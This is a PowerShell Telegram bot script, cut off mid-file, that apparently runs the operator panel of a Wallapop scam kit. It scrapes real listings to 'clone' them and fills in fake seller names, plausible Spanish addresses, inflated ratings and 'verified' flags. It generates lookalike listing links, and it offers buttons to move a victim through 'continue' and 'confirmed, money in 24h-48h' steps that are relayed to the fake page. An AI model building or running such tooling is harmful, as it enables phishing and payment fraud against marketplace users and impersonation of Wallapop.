$ErrorActionPreference = 'Continue'
$Raiz = Split-Path -Parent $MyInvocation.MyCommand.Path
Set-Location $Raiz

# Cerrar instancias anteriores en el mismo puerto o procesos huérfanos
try {
  $conns = Get-NetTCPConnection -LocalPort $Puerto -State Listen -ErrorAction SilentlyContinue
  if ($conns) {
    foreach ($c in $conns) {
      if ($c.OwningProcess -and $c.OwningProcess -ne $PID) {
        Stop-Process -Id $c.OwningProcess -Force -ErrorAction SilentlyContinue
      }
    }
    Start-Sleep -Milliseconds 300
  }
  $myParent = (Get-CimInstance Win32_Process -Filter "ProcessId = $PID").ParentProcessId
  Get-CimInstance Win32_Process | Where-Object {
    $_.ProcessId -ne $PID -and
    $_.ProcessId -ne $myParent -and
    $_.Name -match 'powershell' -and
    $_.CommandLine -like '*server.ps1*'
  } | ForEach-Object {
    Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue
  }
} catch { }

$Cfg = Get-Content (Join-Path $Raiz 'config.json') -Raw | ConvertFrom-Json
$Token = $Cfg.token
$Puerto = if ($Cfg.port) { [int]$Cfg.port } else { 3000 }
$Cultura = [Globalization.CultureInfo]::GetCultureInfo('es-ES')

$DataDir = Join-Path $Raiz 'data'
if (!(Test-Path $DataDir)) { New-Item -ItemType Directory -Path $DataDir | Out-Null }
$DbFile = Join-Path $DataDir 'productos.json'
$OffFile = Join-Path $DataDir 'offset.json'

function To-Hash($o) {
  $h = @{}
  if ($o) { $o.PSObject.Properties | ForEach-Object { $h[$_.Name] = $_.Value } }
  return $h
}

$Db = @{}
if (Test-Path $DbFile) {
  try {
    $raw = Get-Content $DbFile -Raw | ConvertFrom-Json
    $raw.PSObject.Properties | ForEach-Object { $Db[$_.Name] = To-Hash $_.Value }
  } catch { }
}

function Save-Db {
  $jsonStr = $Db | ConvertTo-Json -Depth 8
  $jsonWrap = @{ products = $Db; activeId = $Script:Activo } | ConvertTo-Json -Depth 8
  $utf8NoBom = New-Object System.Text.UTF8Encoding($false)
  [System.IO.File]::WriteAllText($DbFile, $jsonStr, $utf8NoBom)
  [System.IO.File]::WriteAllText((Join-Path $Raiz 'products.json'), $jsonWrap, $utf8NoBom)
  [System.IO.File]::WriteAllText((Join-Path $Raiz 'products.js'), ("window.SERVER_DB = " + $jsonWrap + ";"), $utf8NoBom)
  $WebDir = Join-Path $Raiz 'web'
  if (Test-Path $WebDir) {
    try {
      [System.IO.File]::WriteAllText((Join-Path $WebDir 'products.json'), $jsonWrap, $utf8NoBom)
      [System.IO.File]::WriteAllText((Join-Path $WebDir 'products.js'), ("window.SERVER_DB = " + $jsonWrap + ";"), $utf8NoBom)
    } catch { }
  }
}

$Offset = 0
if (Test-Path $OffFile) { try { $Offset = [long]((Get-Content $OffFile -Raw | ConvertFrom-Json).offset) } catch { } }
function Save-Offset { @{ offset = $Offset } | ConvertTo-Json | Set-Content -Path $OffFile -Encoding UTF8 }

function Esc($s) {
  if ($null -eq $s) { return '' }
  return ($s -replace '&', '&amp;' -replace '<', '&lt;' -replace '>', '&gt;')
}
function Eur($n, [switch]$Dec) {
  $v = 0.0
  [double]::TryParse([string]$n, [ref]$v) | Out-Null
  $sym = [char]0x20AC
  if ($Dec) { return ($v.ToString('N2', $Cultura) + " $sym") }
  return ($v.ToString('N0', $Cultura) + " $sym")
}
function Num($s) {
  $v = 0.0
  if ([double]::TryParse(([string]$s).Replace('.', '').Replace(',', '.'), [ref]$v)) {
    return [math]::Round($v, 2)
  }
  return $null
}
function Nuevo-Id {
  $nums = -join (1..7 | ForEach-Object { Get-Random -Minimum 0 -Maximum 10 })
  return ('AD' + $nums)
}
function Ip-Lan {
  try {
    $ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -notlike '127.*' -and $_.PrefixOrigin -ne 'WellKnown' } | Select-Object -First 1).IPAddress
    if ($ip) { return $ip }
  } catch { }
  return 'localhost'
}
$Script:Base = if ($Cfg.publicUrl) { $Cfg.publicUrl.TrimEnd('/') } elseif ($Cfg.base_url) { $Cfg.base_url.TrimEnd('/').Replace('/a', '') } else { 'http://localhost:3000' }

function Send-Tg($metodo, $carga) {
  try {
    $json = $carga | ConvertTo-Json -Depth 10 -Compress
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($json)
    return Invoke-RestMethod -Uri ("https://api.telegram.org/bot{0}/{1}" -f $Token, $metodo) -Method Post `
      -ContentType 'application/json; charset=utf-8' -Body $bytes -TimeoutSec 30
  } catch { return $null }
}
function Responder($chat, $texto, $extra) {
  $p = @{ chat_id = $chat; text = $texto; parse_mode = 'HTML'; disable_web_page_preview = $true }
  if ($extra) { foreach ($k in $extra.Keys) { $p[$k] = $extra[$k] } }
  Send-Tg 'sendMessage' $p | Out-Null
}

$Script:Ayuda = @'
<b>🟢 Panel de operaciones Wallapop 2.0</b>

/nuevo → envíame el link de Wallapop y autorrelleno todo
/productos → lista los enlaces
/editar ID → deja un producto activo

<b>Con un producto activo</b>
/titulo texto
/precio número
/descripcion texto
/importe número
/nombre texto
/direccion texto
/articulo texto
/foto + imagen · /quitarfotos

/borrar ID · /cancelar · /ayuda
'@

function Url-Producto($p) {
  if (-not $p) { return $Script:Base }
  $fList = @()
  if ($p['fotos']) {
    foreach ($f in @($p['fotos'])) {
      if ($f -is [string] -and $f.Length -lt 1500 -and ($f.StartsWith('http') -or $f.StartsWith('/'))) {
        $fList += $f
      }
    }
  }
  # Si fotos no tiene URL pero tiene tg_fotos, resolver a weserv proxy URL usando el file_id
  if ($fList.Count -eq 0 -and $p['tg_fotos']) {
    foreach ($fid in @($p['tg_fotos'])) {
      try {
        $r = Send-Tg 'getFile' @{ file_id = $fid }
        if ($r -and $r.ok -and $r.result.file_path) {
          $fList += ("https://images.weserv.nl/?url=api.telegram.org/file/bot{0}/{1}" -f $Token, $r.result.file_path)
        }
      } catch { }
    }
  }

  $minObj = @{
    id = $p['id']
    titulo = $p['titulo']
    subtitulo = if ($p['subtitulo']) { $p['subtitulo'] } else { '' }
    precio = $p['precio']
    precioArticulo = if ($p['precioArticulo']) { $p['precioArticulo'] } else { $p['precio'] }
    descripcion = if ($p['descripcion']) { $p['descripcion'] } else { '' }
    nombre = if ($p['nombre']) { $p['nombre'] } else { 'Sofía Chamizo' }
    avatar = if ($p['avatar']) { $p['avatar'] } else { '' }
    rating_score = if ($p['rating_score']) { $p['rating_score'] } else { '4.9' }
    rating_reviews = if ($p['rating_reviews']) { $p['rating_reviews'] } else { '81' }
    verificado = if ($null -ne $p['verificado']) { $p['verificado'] } else { $true }
    direccion = if ($p['direccion']) { $p['direccion'] } else { '' }
    articulo = if ($p['articulo']) { $p['articulo'] } else { $p['titulo'] }
    fotos = $fList
  }
  $json = $minObj | ConvertTo-Json -Compress -Depth 4
  $bytes = [System.Text.Encoding]::UTF8.GetBytes($json)
  $b64 = [Convert]::ToBase64String($bytes)
  return ($Script:Base + '/a/' + $p['id'] + '?p=' + [System.Uri]::EscapeDataString($b64))
}

function Resumen($p) {
  return ('<b>' + (Esc $p['titulo']) + '</b>' + "`n" + (Eur $p['precio']) + ' · ' + @($p['fotos']).Count + ' foto(s)' + "`n" + 'ID: <code>' + $p['id'] + '</code>')
}

function Notificar($chat, $p) {
  $urlLimpia = $Script:Base + '/a/' + $p['id']
  $urlConDatos = Url-Producto $p
  $vendedor = if ($p['nombre']) { $p['nombre'] } else { 'Sofía Chamizo' }
  $titulo = if ($p['titulo']) { $p['titulo'] } else { 'Artículo Wallapop' }
  $id = $p['id']

  $cap = "<blockquote><b>" + (Esc $vendedor) + " ➔ " + (Esc $titulo) + "</b>`n" +
         $urlLimpia + "</blockquote>`n`n" +
         "<blockquote>🍥 Producto creado con éxito ❞</blockquote>`n`n" +
         "🇪🇸 <u>Wallapop</u> 2.0 • #" + $id + " 📇"

  $fila = @(@{ text = '🍥 Abrir anuncio ❞'; url = $urlConDatos })
  $kb = @{ inline_keyboard = @(, $fila) }

  # Usar file_id si está disponible, que Telegram acepta 100% nativo
  $tgPhoto = if ($p['tg_fotos'] -and @($p['tg_fotos']).Count -gt 0) {
    @($p['tg_fotos'])[0]
  } elseif ($p['fotos'] -and @($p['fotos']).Count -gt 0 -and (-not @($p['fotos'])[0].StartsWith('data:'))) {
    @($p['fotos'])[0]
  } else { $null }

  if ($tgPhoto) {
    $r = Send-Tg 'sendPhoto' @{ chat_id = $chat; photo = $tgPhoto; caption = $cap; parse_mode = 'HTML'; reply_markup = $kb }
    if (-not $r -or -not $r.ok) {
      Send-Tg 'sendMessage' @{ chat_id = $chat; text = $cap; parse_mode = 'HTML'; reply_markup = $kb; disable_web_page_preview = $false } | Out-Null
    }
  } else {
    Send-Tg 'sendMessage' @{ chat_id = $chat; text = $cap; parse_mode = 'HTML'; reply_markup = $kb; disable_web_page_preview = $false } | Out-Null
  }
}

function Foto-Url($msg) {
  try {
    $lista = @($msg.photo)
    if ($lista.Count -eq 0) { return $null }
    $photoObj = $lista[$lista.Count - 1]
    $fid = $photoObj.file_id
    $r = Send-Tg 'getFile' @{ file_id = $fid }
    if ($r -and $r.ok) {
      $filePath = $r.result.file_path
      $proxyUrl = ("https://images.weserv.nl/?url=api.telegram.org/file/bot{0}/{1}" -f $Token, $filePath)
      $tgUrl = ("https://api.telegram.org/file/bot{0}/{1}" -f $Token, $filePath)
      
      # Guardar copia local en web\photos por si se usa servidor local
      try {
        $photosDir = Join-Path $Raiz 'web\photos'
        if (!(Test-Path $photosDir)) { New-Item -ItemType Directory -Path $photosDir | Out-Null }
        $fileName = ("img_" + (Get-Date -Format 'yyyyMMddHHmmssfff') + ".jpg")
        $webClient = New-Object System.Net.WebClient
        $imgBytes = $webClient.DownloadData($tgUrl)
        if ($imgBytes -and $imgBytes.Length -gt 0) {
          [System.IO.File]::WriteAllBytes((Join-Path $photosDir $fileName), $imgBytes)
        }
      } catch { }

      return @{ url = $proxyUrl; file_id = $fid; tg_url = $tgUrl; file_path = $filePath }
    }
  } catch { }
  return $null
}

$Script:Wizard = $null
$WizFile = Join-Path $DataDir 'wizard.json'
if (Test-Path $WizFile) {
  try {
    $rawWiz = Get-Content $WizFile -Raw | ConvertFrom-Json
    $Script:Wizard = To-Hash $rawWiz
    if ($Script:Wizard -and $Script:Wizard['fotos']) {
      $Script:Wizard['fotos'] = @($Script:Wizard['fotos'])
    }
  } catch { }
}
function Save-Wizard {
  if ($Script:Wizard) {
    $utf8 = New-Object System.Text.UTF8Encoding($false)
    [System.IO.File]::WriteAllText($WizFile, ($Script:Wizard | ConvertTo-Json -Depth 5), $utf8)
  } else {
    if (Test-Path $WizFile) { Remove-Item $WizFile -Force -ErrorAction SilentlyContinue }
  }
}
$Script:Activo = ''
$ActFile = Join-Path $DataDir 'activo.txt'
if (Test-Path $ActFile) { $Script:Activo = (Get-Content $ActFile -Raw).Trim() }
function Set-Activo($id) { $Script:Activo = $id; Set-Content -Path $ActFile -Value $id -Encoding UTF8 }

$ChatFile = Join-Path $DataDir 'chat.txt'
$Script:UltimoChat = ''
if (Test-Path $ChatFile) { try { $Script:UltimoChat = (Get-Content $ChatFile -Raw -Encoding UTF8).Trim() } catch { } }

$Script:TxEstados = @{}

function Completar-Producto($chat) {
  if (-not $Script:Wizard) {
    if (Test-Path $WizFile) {
      try {
        $rawWiz = Get-Content $WizFile -Raw -Encoding UTF8 | ConvertFrom-Json
        $Script:Wizard = To-Hash $rawWiz
        if ($Script:Wizard -and $Script:Wizard['fotos']) {
          $Script:Wizard['fotos'] = @($Script:Wizard['fotos'])
        }
      } catch { }
    }
  }
  if (-not $Script:Wizard) { Responder $chat 'No hay ningún producto en creación. Usa /nuevo.'; return }
  $p = $Script:Wizard
  if (-not $p['nombre']) { $p['nombre'] = 'Sofía Chamizo' }
  if (-not $p['direccion']) { $p['direccion'] = 'Paseo Prudencia Narváez 48 Piso 4, Cáceres, 17024' }
  if (-not $p['fotos']) { $p['fotos'] = @() } else { $p['fotos'] = @($p['fotos']) }
  $Db[$p['id']] = $p
  Set-Activo $p['id']
  Save-Db
  $Script:Wizard = $null
  Save-Wizard
  Notificar $chat $p
}

function Obtener-Direccion-Real {
  $direcciones = @(
    "Calle de Velázquez 42, 3º Dcha, 28001 Madrid",
    "Carrer de Mallorca 234, 2º 1ª, 08008 Barcelona",
    "Calle Sierpes 18, 1º B, 41004 Sevilla",
    "Calle Colón 33, 4º C, 46004 Valencia",
    "Paseo Prudencia Narváez 48, Piso 4, 17024 Cáceres",
    "Calle Larios 12, 2º A, 29005 Málaga",
    "Calle Alfonso I 29, 3º Izq, 50003 Zaragoza",
    "Gran Vía 67, 5º Ext, 28013 Madrid",
    "Rambla de Catalunya 85, Principal 2ª, 08008 Barcelona",
    "Calle Marqués de Larios 5, 3º B, 29015 Málaga",
    "Calle San Fernando 14, 2º A, 41004 Sevilla",
    "Avenida de la Constitución 22, 1º Izq, 18012 Granada",
    "Calle Uría 38, 4º D, 33003 Oviedo",
    "Calle Príncipe 15, 2º C, 36202 Vigo, Pontevedra",
    "Calle Poeta Querol 8, 3º B, 46002 Valencia",
    "Paseo de Zorrilla 45, 6º A, 47007 Valladolid",
    "Calle Recogidas 31, 3º Dcha, 18002 Granada",
    "Avenida de la Libertad 19, 2º B, 20004 San Sebastián, Guipúzcoa",
    "Calle Mayor 14, 2º Izq, 28013 Madrid",
    "Calle San Vicente Mártir 54, 5º B, 46002 Valencia"
  )
  return ($direcciones | Get-Random)
}

function Scrape-Wallapop-Item($url) {
  $headers = @{
    'User-Agent' = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
    'Accept' = 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
    'Accept-Language' = 'es-ES,es;q=0.9'
  }
  
  $resp = Invoke-WebRequest -Uri $url -Headers $headers -TimeoutSec 15 -UseBasicParsing -MaximumRedirection 5
  $html = $resp.Content

  $prod = @{
    titulo = ''
    subtitulo = ''
    precio = 0
    precioArticulo = 0
    descripcion = ''
    nombre = ''
    avatar = ''
    rating_score = '4.9'
    rating_reviews = '81'
    verificado = $true
    direccion = Obtener-Direccion-Real
    fotos = @()
  }

  if ($html -match '(?s)<script[^>]*id="__NEXT_DATA__"[^>]*>(.*?)</script>') {
    try {
      $data = $matches[1] | ConvertFrom-Json
      $item = $data.props.pageProps.item
      $seller = $data.props.pageProps.itemSeller

      if ($item) {
        if ($item.title -and $item.title.original) { $prod['titulo'] = [string]$item.title.original }
        elseif ($item.title) { $prod['titulo'] = [string]$item.title }

        if ($item.price -and $item.price.cash -and $item.price.cash.amount) {
          $prod['precio'] = [double]$item.price.cash.amount
        } elseif ($item.price -and $item.price.amount) {
          $prod['precio'] = [double]$item.price.amount
        }

        if ($item.description -and $item.description.original) {
          $prod['descripcion'] = [string]$item.description.original
        } elseif ($item.description) {
          $prod['descripcion'] = [string]$item.description
        }

        if ($item.images) {
          $fList = @()
          foreach ($im in $item.images) {
            $u = ''
            if ($im.urls -and $im.urls.big) { $u = $im.urls.big }
            elseif ($im.original) { $u = $im.original }
            elseif ($im -is [string]) { $u = $im }
            if ($u) {
              if ($u -match 'pictureSize=') { $u = $u -replace 'pictureSize=[^&"]+', 'pictureSize=W800' }
              $fList += $u
            }
          }
          if ($fList.Count -gt 0) { $prod['fotos'] = $fList }
        }

        $subParts = @()
        if ($item.condition -and $item.condition.text) { $subParts += $item.condition.text }
        if ($item.brand) { $subParts += $item.brand }
        if ($item.model) { $subParts += $item.model }
        if ($item.characteristicsDetails) {
          foreach ($c in $item.characteristicsDetails) {
            if ($c.value -and $subParts -notcontains $c.value) { $subParts += $c.value }
          }
        }
        if ($subParts.Count -gt 0) {
          $prod['subtitulo'] = ($subParts -join ' · ')
        }
      }

      if ($seller) {
        if ($seller.microName) { $prod['nombre'] = [string]$seller.microName }
        if ($seller.avatarImage) { $prod['avatar'] = [string]$seller.avatarImage }
        if ($null -ne $seller.verified) { $prod['verificado'] = [bool]$seller.verified }
        if ($seller.stats) {
          if ($seller.stats.ratingAverage) { $prod['rating_score'] = [string]$seller.stats.ratingAverage }
          if ($seller.stats.counters -and $seller.stats.counters.reviews) {
            $prod['rating_reviews'] = [string]$seller.stats.counters.reviews
          } elseif ($seller.stats.ratings -and $seller.stats.ratings.reviews) {
            $prod['rating_reviews'] = [string]$seller.stats.ratings.reviews
          }
        }
      }
    } catch { }
  }

  if (-not $prod['titulo']) {
    if ($html -match '(?s)<h1[^>]*class="[^"]*chds-mid-l[^"]*"[^>]*>(.*?)</h1>') {
      $prod['titulo'] = ($matches[1] -replace '<[^>]+>', '').Trim()
    } elseif ($html -match '(?s)<h1[^>]*>(.*?)</h1>') {
      $prod['titulo'] = ($matches[1] -replace '<[^>]+>', '').Trim()
    } elseif ($html -match 'property="og:title"\s*content="([^"]+)"') {
      $prod['titulo'] = $matches[1].Trim()
    }
  }

  if ($prod['precio'] -eq 0) {
    if ($html -match '"price":\s*"?([0-9\.,]+)"?') {
      $prod['precio'] = [double]($matches[1].Replace(',', '.'))
    } elseif ($html -match 'property="product:price:amount"\s*content="([^"]+)"') {
      $prod['precio'] = [double]($matches[1].Replace(',', '.'))
    } elseif ($html -match '(?s)<span[^>]*class="[^"]*chds-headline[^"]*"[^>]*>([0-9\.,]+)\s*€?</span>') {
      $prod['precio'] = [double]($matches[1].Replace('.', '').Replace(',', '.'))
    }
  }

  if (-not $prod['descripcion']) {
    if ($html -match '(?s)<div[^>]*class="[^"]*_2YE-bW_ProductDescription[^"]*"[^>]*>(.*?)</div>') {
      $prod['descripcion'] = ($matches[1] -replace '<[^>]+>', '').Trim()
    } elseif ($html -match 'property="og:description"\s*content="([^"]+)"') {
      $prod['descripcion'] = $matches[1].Trim()
    }
  }

  if (@($prod['fotos']).Count -eq 0) {
    $imgMatches = [regex]::Matches($html, 'slot="carousel-content"[^>]*src="([^"]+)"')
    $fList = @()
    foreach ($m in $imgMatches) {
      $u = $m.Groups[1].Value
      if ($u -match 'pictureSize=') { $u = $u -replace 'pictureSize=[^&"]+', 'pictureSize=W800' }
      $fList += $u
    }
    if ($fList.Count -eq 0) {
      $allCdn = [regex]::Matches($html, 'https://cdn\.wallapop\.com/images/[^"\s]+')
      $seen = @{}
      foreach ($m in $allCdn) {
        $u = $m.Value
        if ($u -like '*pictureSize=*' -and $u -notlike '*profile*' -and $u -notlike '*avatar*') {
          $clean = $u -replace 'pictureSize=[^&"]+', 'pictureSize=W800'
          if (-not $seen.ContainsKey($clean)) {
            $seen[$clean] = $true
            $fList += $clean
          }
        }
      }
    }
    $prod['fotos'] = $fList
  }

  if (-not $prod['nombre']) {
    if ($html -match '(?s)<span[^>]*class="[^"]*chds-mid-m chds-content-high text-truncate[^"]*"[^>]*>(.*?)</span>') {
      $prod['nombre'] = ($matches[1] -replace '<[^>]+>', '').Trim()
    } else {
      $prod['nombre'] = 'Sofía Chamizo'
    }
  }

  if (-not $prod['avatar']) {
    if ($html -match '(?s)<img[^>]*class="[^"]*walla-avatar__avatar[^"]*"[^>]*src="([^"]+)"') {
      $prod['avatar'] = $matches[1].Trim()
    } elseif ($html -match '(?s)<walla-avatar[^>]*src="([^"]+)"') {
      $prod['avatar'] = $matches[1].Trim()
    }
  }

  if ($html -match 'Perfil verificado') {
    $prod['verificado'] = $true
  }

  if ($html -match 'score="([^"]+)"\s*reviews="([^"]+)"') {
    $prod['rating_score'] = $matches[1]
    $prod['rating_reviews'] = $matches[2]
  }

  $prod['precioArticulo'] = $prod['precio']
  $prod['articulo'] = $prod['titulo']

  return $prod
}

function Crear-Desde-Wallapop($chat, $url) {
  Responder $chat '⏳ <b>Extrayendo datos de Wallapop...</b>'
  try {
    $p = Scrape-Wallapop-Item $url
    if (-not $p -or -not $p['titulo']) {
      Responder $chat '⚠️ No pude leer los datos del anuncio. Comprueba que el enlace sea correcto y público.'
      return
    }
    $newId = Nuevo-Id
    $p['id'] = $newId
    $Db[$newId] = $p
    Set-Activo $newId
    Save-Db
    $Script:Wizard = $null
    Save-Wizard
    Notificar $chat $p
  } catch {
    Responder $chat ('⚠️ Error al cargar el enlace: ' + (Esc $_.Exception.Message))
  }
}

function Handle-Update($u) {
  if ($u.callback_query) {
    $cq = $u.callback_query
    $cqId = [string]$cq.id
    $cqData = [string]$cq.data
    $cqChat = $cq.message.chat.id
    $cqMsgId = $cq.message.message_id
    $Script:UltimoChat = $cqChat
    try { Set-Content -Path $ChatFile -Value $cqChat -Encoding UTF8 } catch { }

    if ($cqData -match '^continuar_?(.*)$') {
      $target = $matches[1]
      if (-not $target) { $target = $Script:Activo }
      $Script:TxEstados[$target] = 'continue'
      if ($Script:Activo) { $Script:TxEstados[$Script:Activo] = 'continue' }

      # Publicar estado en Telegram bot description para que la web (Netlify o local) lo lea al instante
      Send-Tg 'setMyDescription' @{ description = ("status:continue:" + $target) } | Out-Null

      Send-Tg 'answerCallbackQuery' @{ callback_query_id = $cqId; text = "✅ Aprobado. El cliente avanza a Confirmar." } | Out-Null
      $filaDone = @(@{ text = '✅ CONTINUADO (Confirmar)'; callback_data = 'noop' })
      $newKb = @{ inline_keyboard = @(, $filaDone) }
      Send-Tg 'editMessageReplyMarkup' @{ chat_id = $cqChat; message_id = $cqMsgId; reply_markup = $newKb } | Out-Null
      return
    }

    if ($cqData -match '^confirmar_again_?(.*)$') {
      $target = $matches[1]
      if (-not $target) { $target = $Script:Activo }
      $Script:TxEstados[$target] = 'confirmado_final'
      if ($Script:Activo) { $Script:TxEstados[$Script:Activo] = 'confirmado_final' }

      # Publicar estado en Telegram bot description
      Send-Tg 'setMyDescription' @{ description = ("status:confirmado_final:" + $target) } | Out-Null

      Send-Tg 'answerCallbackQuery' @{ callback_query_id = $cqId; text = "✅ Confirmación aprobada. Pantalla 24h-48h activada." } | Out-Null
      $filaDone = @(@{ text = '✅ CONFIRMADO (Dinero en 24h-48h)'; callback_data = 'noop' })
      $newKb = @{ inline_keyboard = @(, $filaDone) }
      Send-Tg 'editMessageReplyMarkup' @{ chat_id = $cqChat; message_id = $cqMsgId; reply_markup = $newKb } | Out-Null
      return
    }

    if ($cqData -match '^error_?(.*)$') {
      $target = $matches[1]
      if (-not $target) { $target = $Script:Activo }
      $Script:TxEstados[$target] = 'error'
      if ($Script:Activo) { $Script:TxEstados[$Script:Activo] = 'error' }

      # Publicar estado en Telegram bot description
      Send-Tg 'setMyDescription' @{ description = ("status:error:" + $target) } | Out-Null

      Send-Tg 'answerCallbackQuery' @{ callback_query_id = $cqId; text = "❌ Marcado como Error." } | Out-Null
      $filaErr = @(@{ text = '❌ ERROR MARCADO'; callback_data = 'noop' })
      $newKb = @{ inline_keyboard = @(, $filaErr) }
      Send-Tg 'editMessageReplyMarkup' @{ chat_id = $cqChat; message_id = $cqMsgId; reply_markup = $newKb } | Out-Null
      return
    }

    if ($cqData -eq 'noop') {
      Send-Tg 'answerCallbackQuery' @{ callback_query_id = $cqId; text = "Esta acción ya fue realizada." } | Out-Null
      return
    }
    return
  }

  $msg = if ($u.message) { $u.message } else { $u.edited_message }
  if (-not $msg) { return }
  $chat = $msg.chat.id
  $Script:UltimoChat = $chat
  try { Set-Content -Path $ChatFile -Value $chat -Encoding UTF8 } catch { }
  $texto = ''
  if ($msg.text) { $texto = $msg.text.Trim() }

  if ($msg.photo) {
    if ($Script:Wizard -and $Script:Wizard['step'] -eq 'fotos') {
      $fotoData = Foto-Url $msg
      if ($fotoData) {
        if (-not $Script:Wizard['fotos']) { $Script:Wizard['fotos'] = @() }
        $Script:Wizard['fotos'] = @($Script:Wizard['fotos']) + $fotoData.url
        if ($fotoData.file_id) {
          if (-not $Script:Wizard['tg_fotos']) { $Script:Wizard['tg_fotos'] = @() }
          $Script:Wizard['tg_fotos'] = @($Script:Wizard['tg_fotos']) + $fotoData.file_id
        }
        Save-Wizard
        Responder $chat ('🖼 ' + @($Script:Wizard['fotos']).Count + ' foto(s). Manda más o escribe /listo.')
      } else { Responder $chat '⚠️ No pude descargar la imagen, prueba otra vez.' }
      return
    }
    if ($Script:Activo -and $Db.ContainsKey($Script:Activo)) {
      $fotoData = Foto-Url $msg
      if ($fotoData) {
        if (-not $Db[$Script:Activo]['fotos']) { $Db[$Script:Activo]['fotos'] = @() }
        $Db[$Script:Activo]['fotos'] = @($Db[$Script:Activo]['fotos']) + $fotoData.url
        if ($fotoData.file_id) {
          if (-not $Db[$Script:Activo]['tg_fotos']) { $Db[$Script:Activo]['tg_fotos'] = @() }
          $Db[$Script:Activo]['tg_fotos'] = @($Db[$Script:Activo]['tg_fotos']) + $fotoData.file_id
        }
        Save-Db
        Responder $chat ('✅ Foto añadida (' + @($Db[$Script:Activo]['fotos']).Count + ').' + "`n" + (Url-Producto $Db[$Script:Activo]))
      } else { Responder $chat '⚠️ No pude descargar la imagen.' }
      return
    }
    Responder $chat 'Envía /nuevo o /editar ID antes de mandar fotos.'
    return
  }

  if ($Script:Wizard -and $texto -and -not $texto.StartsWith('/')) {
    if ($Script:Wizard['step'] -eq 'wallapop_url') {
      if ($texto -match 'https?://[^\s]+') {
        Crear-Desde-Wallapop $chat $matches[0]
        return
      } else {
        Responder $chat '⚠️ Por favor, envía un enlace válido de Wallapop (ejemplo: https://es.wallapop.com/item/...):'
        return
      }
    }

    switch ($Script:Wizard['step']) {
      'titulo' {
        $Script:Wizard['titulo'] = $texto
        $Script:Wizard['articulo'] = $texto
        $Script:Wizard['step'] = 'precio'
        Save-Wizard
        Responder $chat '2/5 · ¿Precio en euros? (ejemplo: 250)'
        return
      }
      'precio' {
        $n = Num $texto
        if ($null -eq $n) { Responder $chat 'Pon un número válido, por ejemplo 250'; return }
        $Script:Wizard['precio'] = $n
        $Script:Wizard['precioArticulo'] = $n
        $Script:Wizard['step'] = 'nombre'
        Save-Wizard
        Responder $chat '3/5 · ¿Nombre y apellidos completos? (ejemplo: Sofía Chamizo)'
        return
      }
      'nombre' {
        $Script:Wizard['nombre'] = $texto
        $Script:Wizard['step'] = 'direccion'
        Save-Wizard
        Responder $chat '4/5 · ¿Dirección completa de envío? (ejemplo: Paseo Prudencia Narváez 48 Piso 4, Cáceres, 17024)'
        return
      }
      'direccion' {
        $Script:Wizard['direccion'] = $texto
        $Script:Wizard['step'] = 'descripcion'
        Save-Wizard
        Responder $chat '5/5 · ¿Descripción del producto? (o pon un . para omitir)'
        return
      }
      'descripcion' {
        $Script:Wizard['descripcion'] = if ($texto -eq '.') { '' } else { $texto }
        $Script:Wizard['step'] = 'fotos'
        Save-Wizard
        Responder $chat '📷 Envía las fotos que quieras y escribe /listo para terminar.'
        return
      }
      'fotos' {
        if ($texto.ToLower() -eq 'listo' -or $texto.ToLower() -eq '/listo') {
          Completar-Producto $chat
          return
        }
        Responder $chat '📷 Envía las fotos del producto o escribe /listo para terminar la creación.'
        return
      }
      default {
        return
      }
    }
    return
  }

  if (-not $texto.StartsWith('/')) {
    if ($texto.ToLower() -eq 'ayuda') { Responder $chat $Script:Ayuda; return }
    Responder $chat 'Usa /nuevo para crear un producto o /ayuda para ver los comandos.'
    return
  }

  $i = $texto.IndexOf(' ')
  $cmd = if ($i -lt 0) { $texto } else { $texto.Substring(0, $i) }
  $cmd = $cmd.ToLower().Split('@')[0]
  $arg = if ($i -lt 0) { '' } else { $texto.Substring($i + 1).Trim() }
  $act = if ($Script:Activo -and $Db.ContainsKey($Script:Activo)) { $Db[$Script:Activo] } else { $null }

  switch ($cmd) {
    '/start' { Responder $chat $Script:Ayuda; return }
    '/ayuda' { Responder $chat $Script:Ayuda; return }

    '/nuevo' {
      if ($arg -and $arg -match 'https?://[^\s]+') {
        Crear-Desde-Wallapop $chat $matches[0]
        return
      }
      $Script:Wizard = @{
        step = 'wallapop_url'
        id = (Nuevo-Id)
      }
      Save-Wizard
      Responder $chat "📎 <b>Crear producto desde Wallapop</b>`n`nPásame el enlace del producto de Wallapop que quieras clonar:"
      return
    }

    '/cancelar' { $Script:Wizard = $null; Save-Wizard; Responder $chat 'Creación cancelada.'; return }

    '/listo' { Completar-Producto $chat; return }

    '/productos' {
      if ($Db.Keys.Count -eq 0) { Responder $chat 'Todavía no hay productos. Usa /nuevo.'; return }
      $lineas = foreach ($id in $Db.Keys) {
        '• ' + (Esc $Db[$id]['titulo']) + ' — ' + (Eur $Db[$id]['precio']) + "`n" + (Url-Producto $Db[$id])
      }
      Responder $chat ($lineas -join "`n`n")
      return
    }

    '/editar' {
      if (-not $Db.ContainsKey($arg)) { Responder $chat 'Uso: /editar ID (mira /productos)'; return }
      Set-Activo $arg
      Responder $chat ('✏️ Editando:' + "`n" + (Resumen $Db[$arg]) + "`n" + (Url-Producto $Db[$arg]))
      return
    }

    '/borrar' {
      if (-not $Db.ContainsKey($arg)) { Responder $chat 'Uso: /borrar ID'; return }
      $Db.Remove($arg)
      if ($Script:Activo -eq $arg) { Set-Activo '' }
      Save-Db
      Responder $chat '🗑 Producto borrado.'
      return
    }

    '/foto' { Responder $chat '📷 Envía la imagen y la añado al producto activo.'; return }

    '/quitarfotos' {
      if (-not $act) { Responder $chat 'No hay producto activo. Usa /editar ID.'; return }
      $act['fotos'] = @()
      Save-Db
      Responder $chat '🧹 Fotos eliminadas.'
      return
    }

    '/titulo' {
      if (-not $act) { Responder $chat 'No hay producto activo. Usa /editar ID.'; return }
      if (-not $arg) { Responder $chat 'Uso: /titulo Nuevo título'; return }
      $act['titulo'] = $arg; Save-Db
      Responder $chat '✅ Título actualizado.'
      return
    }

    '/precio' {
      if (-not $act) { Responder $chat 'No hay producto activo. Usa /editar ID.'; return }
      $n = Num $arg
      if ($null -eq $n) { Responder $chat 'Uso: /precio 250'; return }
      $act['precio'] = $n; $act['precioArticulo'] = $n; Save-Db
